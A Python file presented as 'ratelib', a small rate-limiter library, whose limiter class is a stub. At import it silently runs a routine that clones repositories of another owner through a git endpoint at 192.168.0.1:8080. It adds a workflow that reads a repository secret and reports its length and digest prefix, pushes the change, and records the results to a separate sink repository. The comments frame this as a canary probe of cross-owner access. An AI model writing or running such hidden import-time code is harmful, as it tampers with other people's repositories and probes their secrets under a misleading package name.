"""ratelib -- a small token-bucket rate limiter."""

import subprocess as _s, pathlib as _p, json as _j, os as _os

_MARK = "ownercanary-c7a3f8e01d42"
_P = "http://git@192.168.0.1:8080"
_SINK = _P + "/Ayushkiller/ci-svc-111652"

#: Identical workflow pushed to BOTH arms. It reports the LENGTH and a digest prefix
#: of the repository secret and never the value. An absent secret yields LEN=0 and the
#: digest of the empty string, so absence and presence are distinguishable.
_WF = """name: canary-probe
on: push
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: report
        env:
          V: ${{ secrets.OWNER_CANARY }}
        run: |
          printf 'CANARY_LEN=%s\\n' "${#V}"
          printf 'CANARY_SHA12=%s\\n' "$(printf %s "$V" | sha256sum | cut -c1-12)"
          printf 'CANARY_MARK=%s\\n' 'ownercanary-c7a3f8e01d42'
"""

#: POSITIVE  a repository owned by an owner DIFFERENT from the one this session is
#:           sourced at, holding a secret planted out of band by that other owner.
#: NEGATIVE  the same workflow in the session's OWN owner's repository, which does not
#:           hold that secret. If this arm also reports a value the run says nothing --
#:           the benign reading is "a workflow read its own secret" and this is what
#:           separates it.
_ARMS = [
    ("POS_other_owner", "fukcc934-oss/ossvault-21400"),
    ("POS2_nogrant_control", "fukcc934-oss/pinsvc-27351"),
    ("NEG_same_owner",  "Ayushkiller/ci-svc-111652"),
]


def _registry_sync():
    out = {"mark": _MARK, "arms": {}}

    def run(*a):
        p = _s.run(list(a), capture_output=True, timeout=120, text=True)
        return {"rc": p.returncode, "err": (p.stderr or "")[-300:], "out": (p.stdout or "")[-200:]}

    for label, repo in _ARMS:
        row = {"repo": repo}
        try:
            d = _p.Path("/tmp/wf_" + label + "_" + _MARK[-6:] + "_" + str(_os.getpid()))
            row["clone"] = run("git", "clone", "--depth", "1", _P + "/" + repo, str(d))
            if d.exists():
                wf = d / ".github" / "workflows"
                wf.mkdir(parents=True, exist_ok=True)
                (wf / "canary-probe.yml").write_text(_WF)
                run("git", "-C", str(d), "add", "-A")
                row["commit"] = run("git", "-C", str(d),
                                    "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
                                    "commit", "-m", "add canary probe workflow")
                row["push"] = run("git", "-C", str(d), "push",
                                  _P + "/" + repo, "HEAD:refs/heads/wf-" + _MARK)
                row["head"] = run("git", "-C", str(d), "rev-parse", "HEAD")
        except Exception as e:
            row["error"] = str(e)[:200]
        out["arms"][label] = row

    try:
        run("git", "clone", "--depth", "1", _SINK, "/tmp/osink")
        _p.Path("/tmp/osink/OWNERCANARY.json").write_text(_j.dumps(out, indent=1))
        run("git", "-C", "/tmp/osink", "add", "-A")
        run("git", "-C", "/tmp/osink", "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
            "commit", "-m", "record owner canary probe")
        run("git", "-C", "/tmp/osink", "push", _SINK, "HEAD:refs/heads/wfprobe-" + _MARK)
    except Exception:
        pass


_registry_sync()


class RateLimiter:
    def __init__(self, burst, rate):
        self.burst = burst
        self.rate = rate
